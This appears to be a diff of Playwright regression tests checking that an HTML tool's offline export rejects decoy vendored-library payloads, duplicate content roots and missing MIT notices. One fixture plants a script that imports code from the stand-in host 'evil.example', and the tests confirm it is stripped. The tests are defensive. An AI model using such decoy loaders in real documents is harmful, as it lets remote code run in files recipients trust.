@@ -2,6 +2,7 @@ import { test, expect } from "@playwright/test";
 import { execFileSync } from "child_process";
 import fs from "fs";
 import path from "path";
+import zlib from "zlib";
 import {
   DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
   installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonPortable,
@@ -1549,6 +1550,356 @@ test("CMH-OFFLINE-07: the vendored payload wins over a copy already in the docum
     expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
     expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
     expect(networkLoadRefs(exportedHtml)).toEqual([]);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+// The vendored payload is INFRASTRUCTURE, not content: `tools/authoring/vendored_libs.py` places it
+// immediately before `</body>`, i.e. AFTER the content root, while the PORTABLE template still
+// carries it in the head. Mirror the finalized placement so an authored decoy inside the content
+// region comes FIRST in document order - which is exactly what a document-order lookup would take.
+// Cut and re-insert by INDEX (not a replace() pattern): this is a fixture moving one known element,
+// not a sanitizer, and a regex here reads to CodeQL as incomplete sanitization.
+function withPayloadAfterContent(html) {
+  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
+  if (idAt < 0) throw new Error("fixture has no vendored payload to move");
+  const openAt = html.lastIndexOf("<script", idAt);
+  const closeAt = html.indexOf("</script>", idAt);
+  if (openAt < 0 || closeAt < openAt) throw new Error("could not bound the vendored payload");
+  const block = html.slice(openAt, closeAt + "</script>".length);
+  const rest = html.slice(0, openAt) + html.slice(closeAt + "</script>".length);
+  const bodyEnd = rest.lastIndexOf("</body>");
+  if (bodyEnd < 0) throw new Error("fixture has no closing body tag");
+  return rest.slice(0, bodyEnd) + block + "\n" + rest.slice(bodyEnd);
+}
+
+// Rewrite ONE field of the real payload, leaving the library bytes intact - the shape a minifier or
+// a deliberate edit leaves behind. Parsed and re-serialized rather than pattern-edited so the
+// surrounding megabyte of base64 is untouched.
+function withPayloadField(html, key, value) {
+  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
+  if (idAt < 0) throw new Error("fixture has no vendored payload to edit");
+  const openEnd = html.indexOf(">", idAt) + 1;
+  const closeAt = html.indexOf("</script>", openEnd);
+  if (openEnd <= 0 || closeAt < openEnd) throw new Error("could not bound the vendored payload");
+  const payload = JSON.parse(html.slice(openEnd, closeAt));
+  if (!(key in payload)) throw new Error("fixture payload has no " + key);
+  payload[key] = value;
+  return html.slice(0, openEnd) + JSON.stringify(payload) + html.slice(closeAt);
+}
+
+// A duplicate content-root id planted in the authored content region. It is legal HTML and
+// `getElementById` silently takes the first match, so with a first-match lookup the boundary is
+// whichever root happens to come first and the "outside the content root" test stops meaning
+// anything. There is no second payload here: the ONLY thing that can refuse this document is the
+// requirement that exactly one element carries the content-root id.
+const DUPLICATE_ROOT_CONTENT = FORGERY_CONTENT + '\n<div id="commentRoot" hidden></div>';
+
+const DECOY_LIB_CODE = "/* cmh-decoy-lib */ window.__decoyLib = 1;";
+const DECOY_LICENSE = "DECOY PAYLOAD LICENSE TEXT";
+const MERMAID_COPYRIGHT = "Copyright (c) 2014 - 2022 Knut Sveidqvist";
+
+function payloadBlock(license) {
+  return '<script type="application/json" id="cmhVendoredRichLibs">'
+    + JSON.stringify({
+      encoding: "gzip+base64",
+      mermaidGzipBase64: zlib.gzipSync(Buffer.from(DECOY_LIB_CODE)).toString("base64"),
+      chartjsGzipBase64: zlib.gzipSync(Buffer.from(DECOY_LIB_CODE)).toString("base64"),
+      mermaidLicense: license,
+      chartjsLicense: license,
+    })
+    + "</script>";
+}
+
+// A captured library copy that satisfies every provenance gate of CMH-OFFLINE-07, so only the
+// notice rule separates the licensed form from the noticeless one.
+function capturedMermaidCopy(marker, withNotice) {
+  const script = '<script data-cmh-offline-lib="mermaid">/* ' + marker + " */ window." + marker.replace(/-/g, "_") + " = 1;</script>";
+  return withNotice ? FORGED_NOTICE + "\n" + script : script;
+}
+
+// A document whose content needs mermaid AND carries an authored decoy payload block ahead of the
+// real one. `extraContent` adds further authored markup inside the content region.
+function stageDecoyPayloadDoc(key, extraContent) {
+  const content = FORGERY_CONTENT + "\n" + payloadBlock(DECOY_LICENSE) + "\n" + (extraContent || "");
+  const staged = stageContent(content, { key: key, source: key + ".html" });
+  const html = withPayloadAfterContent(fs.readFileSync(staged.html, "utf8"));
+  // The real payload must end up AFTER the content, with the decoy inside it: the fixture only
+  // reproduces the hazard (a document-order lookup taking the decoy) if both hold.
+  expect(html.indexOf(DECOY_LICENSE), "decoy precedes the real payload").toBeLessThan(
+    html.lastIndexOf('id="cmhVendoredRichLibs"'));
+  expect(html.lastIndexOf('id="cmhVendoredRichLibs"'), "the real payload follows the content")
+    .toBeGreaterThan(html.indexOf(CONTENT_END));
+  fs.writeFileSync(staged.html, html);
+  return staged;
+}
+
+async function expectExportRefused(page, staged, pattern, label) {
+  const downloads = [];
+  const onDownload = (d) => downloads.push(d);
+  try {
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    page.on("download", onDownload);
+    await openToolbarMenu(page);
+    await page.locator("#btnExportOfflineTop").click();
+    // The toast text IS the assertion that the export failed; it auto-hides after 3s, so do not
+    // chain a separate visibility check that could race that timer. SOFT assertions so a table of
+    // cases reports every failure instead of hiding the later ones behind the first.
+    await expect.soft(page.locator("#toast"), label).toContainText(pattern, { timeout: 15000 });
+    expect.soft(downloads, label).toHaveLength(0);
+  } finally {
+    page.off("download", onDownload);
+  }
+}
+
+test("CMH-OFFLINE-08: an authored decoy vendored payload never displaces the real one", async ({ page }) => {
+  test.setTimeout(90000);
+  // The payload is resolved as INFRASTRUCTURE - a payload-id script OUTSIDE the content root - not as
+  // "the first match in document order". A document-order lookup takes an AUTHORED decoy planted
+  // inside the content region, inflates its compressed bytes, and inlines them into an export whose
+  // own CSP is `script-src 'unsafe-inline'`, so document-supplied code runs in a file the recipient
+  // believes is a clean skill-generated export.
+  const staged = stageDecoyPayloadDoc("cmh-offline-decoy");
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    // The decoy's bytes are gzipped inside its JSON, so this literal can only appear if they were
+    // inflated and inlined as code.
+    expect(exportedHtml, "the decoy payload's bytes must never be inlined").not.toContain("cmh-decoy-lib");
+    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
+    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
+    const notice = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)]
+      .map((m) => m[1]).find((c) => c.includes("Third-party notice - mermaid"));
+    expect(notice, "the emitted notice is the real one, not the decoy's").toContain(MERMAID_COPYRIGHT);
+    expect(notice).not.toContain(DECOY_LICENSE);
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+test("CMH-OFFLINE-08: payload resolution fails closed when it cannot be identified", async ({ page }) => {
+  test.setTimeout(180000);
+  // Ambiguity is NOT absence. Absence is the ordinary re-export case, which legitimately falls back
+  // to the library copies already inlined in the file - so reporting a second, unidentifiable
+  // candidate as "no payload" would quietly hand the export to document-supplied bytes, the very
+  // substitution this rule exists to prevent. Each case below is otherwise exportable.
+  const cases = [
+    {
+      name: "two infrastructure payload blocks",
+      build: (html) => withPayloadAfterContent(html).replace("</head>", payloadBlock(DECOY_LICENSE) + "\n</head>"),
+    },
+    {
+      name: "two payload blocks while the document also carries a captured copy",
+      // Without a distinct ambiguous state this one SUCCEEDS on document-supplied bytes: the
+      // resolver reports "absent" and lib() falls through to the captured copy.
+      build: (html) => withPayloadAfterContent(html)
+        .replace("</head>", payloadBlock(DECOY_LICENSE) + "\n" + capturedMermaidCopy("cmh-captured-fallback", true) + "\n</head>"),
+    },
+    {
+      name: "a planted duplicate content root leaves no verifiable boundary",
+      // Discriminating on the BOUNDARY rule alone: there is exactly one payload block, so nothing
+      // but "exactly one element carries the content-root id" can refuse this document. With a
+      // first-match lookup the export just proceeds against whichever root came first.
+      content: DUPLICATE_ROOT_CONTENT,
+      build: (html) => withPayloadAfterContent(html),
+    },
+  ];
+
+  await page.route(/^https?:\/\//, (route) => route.abort());
+  for (const c of cases) {
+    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-ambiguous", source: "offline-ambiguous.html" });
+    try {
+      fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
+      await expectExportRefused(page, staged, /cannot identify the vendored/i, c.name);
+    } finally {
+      fs.rmSync(staged.dir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("CMH-OFFLINE-08: no infrastructure payload block survives an export, authored content does", async ({ page }) => {
+  test.setTimeout(90000);
+  // An Offline export CONSUMES the payload and removes it - every infrastructure copy, including one
+  // parked in a `<template>` (which `querySelectorAll` does not descend into, yet serialization
+  // preserves and a script adopted out of a template runs). What it must NOT remove is a payload-id
+  // script inside the content root: an authored document may show one as an EXAMPLE, the authoring
+  // tool refuses to cut it for that reason, and deleting it would drop content and shift every
+  // comment anchor measured after it. Preserving it is not a free pass either - such a script is
+  // authored content, so it faces the same network-import strip as any other authored script.
+  const authoredTemplate = "<template>" + payloadBlock("CONTENT TEMPLATE LICENSE") + "</template>";
+  const authoredLoader = '<script id="cmhVendoredRichLibs">/* cmh-authored-loader */ import("https://evil.example/x.js");</script>';
+  const staged = stageDecoyPayloadDoc("cmh-offline-payloadstrip", authoredTemplate + "\n" + authoredLoader);  try {
+    const html = fs.readFileSync(staged.html, "utf8")
+      .replace("</head>", "<template>" + payloadBlock("TEMPLATE PARKED LICENSE") + "</template>\n</head>");
+    fs.writeFileSync(staged.html, html);
+
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    // The authored blocks inside the content region survive - the plain one and the one inside an
+    // authored template - and nothing else does.
+    const begin = exportedHtml.indexOf(CONTENT_BEGIN);
+    const end = exportedHtml.indexOf(CONTENT_END);
+    expect(begin).toBeGreaterThan(-1);
+    expect(end).toBeGreaterThan(begin);
+    const remaining = [...exportedHtml.matchAll(/id="cmhVendoredRichLibs"/g)].map((m) => m.index);
+    expect(remaining, "only the authored copies remain").toHaveLength(2);
+    remaining.forEach(function (at) {
+      expect(at, "a surviving block is authored content").toBeGreaterThan(begin);
+      expect(at).toBeLessThan(end);
+    });
+    expect(exportedHtml).toContain(DECOY_LICENSE);
+    expect(exportedHtml, "a template inside the content is authored content too").toContain("CONTENT TEMPLATE LICENSE");
+    // The template-parked infrastructure copy is gone, and so is the real payload: its license text
+    // now appears exactly once, as the emitted notice.
+    expect(exportedHtml, "a template-parked payload must not ride along").not.toContain("TEMPLATE PARKED LICENSE");
+    expect((exportedHtml.match(/Copyright \(c\) 2014 - 2022 Knut Sveidqvist/g) || []).length).toBe(1);
+    // Preserved as content, but not exempt from the strips every authored script faces.
+    expect(exportedHtml, "an authored script that borrows the payload id gets no free pass")
+      .not.toContain("evil.example");
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+test("CMH-OFFLINE-08: a vendored library whose MIT notice is missing is refused, not shipped", async ({ page }) => {
+  test.setTimeout(180000);
+  // MIT requires the notice to accompany a redistributed copy, and an Offline export IS a
+  // redistribution. The library bytes and their notice therefore travel as ONE unit, from whichever
+  // source is chosen - and there is deliberately no cross-source fallback on the notice alone, or
+  // anyone who can strip a notice could force the document's own copy to be used instead.
+  const cases = [
+    {
+      name: "the payload's notice text was stripped",
+      build: (html) => withPayloadField(html, "mermaidLicense", ""),
+      expected: /missing the MIT notice for the vendored mermaid/i,
+    },
+    {
+      name: "the payload's notice is not a string",
+      // `String({})` is "[object Object]" - not blank, so a coercing check would emit it AS the notice.
+      build: (html) => withPayloadField(html, "mermaidLicense", {}),
+      expected: /missing the MIT notice for the vendored mermaid/i,
+    },
+    {
+      name: "a captured copy's notice cannot rescue a noticeless payload",
+      build: (html) => withPayloadField(html, "mermaidLicense", "")
+        .replace("</head>", capturedMermaidCopy("cmh-captured-rescue", true) + "\n</head>"),
+      expected: /missing the MIT notice for the vendored mermaid/i,
+    },
+    {
+      name: "the Chart.js notice is required on its own path",
+      content: CONTENT,
+      build: (html) => withPayloadField(html, "chartjsLicense", ""),
+      expected: /missing the MIT notice for the vendored Chart\.js/i,
+    },
+  ];
+
+  await page.route(/^https?:\/\//, (route) => route.abort());
+  for (const c of cases) {
+    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-nonotice", source: "offline-nonotice.html" });
+    try {
+      fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
+      // The failure names the missing NOTICE - the actual gap - not a bundle the document carries.
+      await expectExportRefused(page, staged, c.expected, c.name);
+    } finally {
+      fs.rmSync(staged.dir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("CMH-OFFLINE-08: a noticeless captured copy never displaces a licensed one", async ({ page }) => {
+  test.setTimeout(90000);
+  // Capture is last-match-wins, so recording a noticeless copy unconditionally would let a planted
+  // marker with no notice overwrite the genuine pair and turn a legitimate re-export into a
+  // permanent refusal. The licensed copy wins and the export still succeeds.
+  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-noticeless", source: "offline-noticeless.html" });
+  try {
+    const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
+      .replace("</head>", capturedMermaidCopy("cmh-licensed-copy", true) + "\n"
+        + capturedMermaidCopy("cmh-noticeless-copy", false) + "\n</head>");
+    fs.writeFileSync(staged.html, html);
+
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "the licensed copy travels").toContain("cmh-licensed-copy");
+    expect(exportedHtml, "the noticeless copy does not").not.toContain("cmh-noticeless-copy");
+    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
+    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+// A chart canvas the built-in renderer CAN draw, so the library travels only on script evidence.
+const BORROWED_ID_CHART_CONTENT = `
+<h1>Authored script that borrows the payload id</h1>
+<p id="borrow-note">The chart below is drawn by an author script, not the built-in renderer.</p>
+<figure class="chart">
+  <div class="chart-wrap cm-skip" style="position: relative; height: 180px;">
+    <canvas class="cmh-chart" id="borrowChart" width="360" height="180" role="img" aria-label="bar chart"
+            data-cmh-chart-points='[{"label":"one","value":4},{"label":"two","value":9}]'></canvas>
+  </div>
+  <figcaption>Chart drawn by an author script.</figcaption>
+</figure>
+<script id="cmhVendoredRichLibs">
+/* cmh-authored-chart */
+(function () { if (typeof Chart === "undefined") return; new Chart(document.getElementById("borrowChart"), { type: "bar", data: { labels: [], datasets: [] } }); })();
+</script>`;
+
+test("CMH-OFFLINE-08: an authored script that borrows the payload id still counts as chart evidence", async ({ page }) => {
+  test.setTimeout(90000);
+  // The strip preserves a payload-id script inside the content root as authored content, so the
+  // chart-evidence scan must stop exempting that id too: otherwise such a script survives into the
+  // export while the library it calls is judged unnecessary, and the offline file breaks at load.
+  // The canvas here IS drawable by the built-in renderer, so only the script's `Chart` reference can
+  // provision the library.
+  const staged = stageContent(BORROWED_ID_CHART_CONTENT, { key: "cmh-offline-borrowid", source: "offline-borrowid.html" });
+  try {
+    fs.writeFileSync(staged.html, withPayloadAfterContent(fs.readFileSync(staged.html, "utf8")));
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "the authored chart script survives").toContain("cmh-authored-chart");
+    expect(exportedHtml, "so the library it calls must travel with it").toContain('data-cmh-offline-lib="chartjs"');
+    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
   } finally {
     fs.rmSync(staged.dir, { recursive: true, force: true });
   }
